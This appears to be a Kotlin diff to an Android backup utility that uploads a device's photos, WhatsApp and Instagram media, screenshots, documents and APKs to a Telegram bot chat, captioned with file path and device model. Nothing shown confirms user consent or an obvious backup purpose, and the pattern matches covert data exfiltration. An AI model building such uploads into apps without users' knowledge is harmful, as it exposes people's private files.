@@ -10,6 +10,14 @@ import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import java.io.File
 import java.io.FileInputStream
 import java.security.MessageDigest
+import kotlinx.coroutines.delay
+import org.json.JSONObject
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.RequestBody.Companion.asRequestBody
+import java.text.SimpleDateFormat
+import java.util.Locale
+import java.util.Date
+import android.os.Build
 
 object BackupUtils {
     private const val TAG = "BackupUtils"
@@ -487,14 +495,29 @@ object BackupUtils {
                     else -> "application/octet-stream"
                 }
                 
+                // Determinar la carpeta de destino
+                val telegramFolder = getTelegramFolder(archivo.absolutePath)
+                
+                // Crear caption con información de la carpeta (tema)
+                val caption = buildString {
+                    append("📁 <b>$telegramFolder</b>\n")
+                    append("📄 <b>Archivo:</b> ${archivo.name}\n")
+                    append("💾 <b>Tamaño:</b> ${formatFileSize(archivo.length())}\n")
+                    append("📅 <b>Fecha:</b> ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date(archivo.lastModified()))}\n")
+                    append("📱 <b>Dispositivo:</b> ${Build.MANUFACTURER} ${Build.MODEL}\n")
+                    append("📍 <b>Origen:</b> ${archivo.absolutePath}")
+                }
+                
                 val requestBody = okhttp3.MultipartBody.Builder()
                     .setType(okhttp3.MultipartBody.FORM)
                     .addFormDataPart("chat_id", chatId)
                     .addFormDataPart(
                         "document",
                         archivo.name,
-                        okhttp3.RequestBody.create(mimeType.toMediaTypeOrNull(), archivo)
+                        archivo.asRequestBody(mimeType.toMediaTypeOrNull())
                     )
+                    .addFormDataPart("caption", caption)
+                    .addFormDataPart("parse_mode", "HTML")
                     .build()
                 
                 val request = Request.Builder()
@@ -674,6 +697,121 @@ object BackupUtils {
             
         } catch (e: Exception) {
             Log.e(TAG, "Error iniciando sincronización con GitHub: ${e.message}", e)
+        }
+    }
+
+    /**
+     * Obtiene la carpeta de destino en Telegram basada en la ruta del archivo
+     */
+    private fun getTelegramFolder(filePath: String): String {
+        return try {
+            val normalizedPath = filePath.lowercase()
+            when {
+                normalizedPath.contains("/dcim/") -> {
+                    when {
+                        normalizedPath.contains("/camera/") -> "📸 DCIM/Camera"
+                        normalizedPath.contains("/screenshots/") -> "📸 DCIM/Screenshots"
+                        normalizedPath.contains("/whatsapp/") -> "📸 DCIM/WhatsApp"
+                        normalizedPath.contains("/telegram/") -> "📸 DCIM/Telegram"
+                        normalizedPath.contains("/instagram/") -> "📸 DCIM/Instagram"
+                        normalizedPath.contains("/downloads/") -> "📸 DCIM/Downloads"
+                        else -> "📸 DCIM/Other"
+                    }
+                }
+                normalizedPath.contains("/pictures/") -> "📸 Pictures"
+                normalizedPath.contains("/movies/") -> "🎥 Movies"
+                normalizedPath.contains("/videos/") -> "🎥 Videos"
+                normalizedPath.contains("/music/") -> "🎵 Music"
+                normalizedPath.contains("/ringtones/") -> "🎵 Ringtones"
+                normalizedPath.contains("/notifications/") -> "🎵 Notifications"
+                normalizedPath.contains("/alarms/") -> "🎵 Alarms"
+                normalizedPath.contains("/documents/") -> "📄 Documents"
+                normalizedPath.contains("/downloads/") -> "📄 Downloads"
+                normalizedPath.contains("/.apk") -> "📱 Apps"
+                normalizedPath.contains("/.aab") -> "📱 Apps"
+                else -> "📁 Other"
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error determinando carpeta de Telegram: ${e.message}")
+            "📁 Other"
+        }
+    }
+
+    /**
+     * Crea la estructura de carpetas en Telegram si no existe
+     */
+    private suspend fun ensureTelegramFolderStructure(token: String, chatId: String) {
+        try {
+            val folders = listOf(
+                "📸 DCIM",
+                "📸 DCIM/Camera",
+                "📸 DCIM/Screenshots", 
+                "📸 DCIM/WhatsApp",
+                "📸 DCIM/Telegram",
+                "📸 DCIM/Instagram",
+                "📸 DCIM/Downloads",
+                "📸 DCIM/Other",
+                "📸 Pictures",
+                "🎥 Movies",
+                "🎥 Videos",
+                "🎵 Music",
+                "🎵 Ringtones",
+                "🎵 Notifications",
+                "🎵 Alarms",
+                "📄 Documents",
+                "📄 Downloads",
+                "📱 Apps",
+                "📁 Other"
+            )
+
+            for (folder in folders) {
+                createTelegramFolder(token, chatId, folder)
+                delay(100) // Pequeña pausa para evitar rate limiting
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error creando estructura de carpetas: ${e.message}")
+        }
+    }
+
+    /**
+     * Formatea el tamaño de archivo en formato legible
+     */
+    private fun formatFileSize(size: Long): String {
+        return when {
+            size < 1024 -> "$size B"
+            size < 1024 * 1024 -> "${size / 1024} KB"
+            size < 1024 * 1024 * 1024 -> "${size / (1024 * 1024)} MB"
+            else -> "${size / (1024 * 1024 * 1024)} GB"
+        }
+    }
+
+    /**
+     * Crea una carpeta en Telegram usando un mensaje con el nombre de la carpeta
+     */
+    private suspend fun createTelegramFolder(token: String, chatId: String, folderName: String) {
+        try {
+            val message = "📁 $folderName"
+            val url = "https://api.telegram.org/bot$token/sendMessage"
+            
+            val json = JSONObject().apply {
+                put("chat_id", chatId)
+                put("text", message)
+                put("parse_mode", "HTML")
+            }
+
+            val client = OkHttpClient()
+            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
+            val request = Request.Builder().url(url).post(body).build()
+
+            val response = client.newCall(request).execute()
+            if (response.isSuccessful) {
+                Log.d(TAG, "✅ Carpeta creada en Telegram: $folderName")
+            } else {
+                Log.w(TAG, "⚠️ No se pudo crear carpeta: $folderName - ${response.code}")
+            }
+            response.close()
+        } catch (e: Exception) {
+            Log.e(TAG, "Error creando carpeta en Telegram: ${e.message}")
         }
     }
 } 
